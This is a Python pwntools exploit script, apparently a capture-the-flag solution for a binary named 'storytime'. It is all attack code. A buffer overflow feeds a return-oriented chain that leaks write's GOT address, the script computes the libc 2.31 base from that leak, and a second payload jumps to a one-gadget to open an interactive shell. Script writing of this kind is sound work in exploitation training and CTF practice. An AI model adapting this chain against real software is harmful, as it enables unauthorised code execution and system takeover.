from pwn import *

target = process('./storytime')
gdb.attach(target, gdbscript='b *0x00400696')

payload_base = b'\x30' * 0x38

main_base = 0x40062e

# leak write address
pop_rdi = 0x400703
pop_rsi_r15 = 0x400701
write_got = 0x601018
write_plt = 0x4004a0

leak_payload = payload_base
leak_payload += p64(pop_rdi)
leak_payload += p64(0x1)
leak_payload += p64(pop_rsi_r15)
leak_payload += p64(write_got)
leak_payload += p64(0x0)
leak_payload += p64(write_plt)
leak_payload += p64(main_base)

target.recvuntil('Tell me a story: \n')
target.send(leak_payload)

write_leak = target.recv(8)
print(f'write_leak : {write_leak}')

# compute the base of libc
libc = ELF('libc-2.31.so')
libc_base = u64(write_leak) - libc.symbols['write']
print(f'libc_base : {hex(libc_base)}')

# use a one gadget
one_gadget = 0xe6c7e + libc_base
# to clean r12, r13, r14 and r15. Most importantly r12 and r15 for this gadget to succeed
pop_registers = 0x4006fc

exploit_payload = payload_base
exploit_payload += p64(pop_registers)
exploit_payload += p64(0x0)
exploit_payload += p64(0x0)
exploit_payload += p64(0x0)
exploit_payload += p64(0x0)
exploit_payload += p64(one_gadget)

target.recvuntil('Tell me a story: \n')
target.send(exploit_payload)

target.interactive()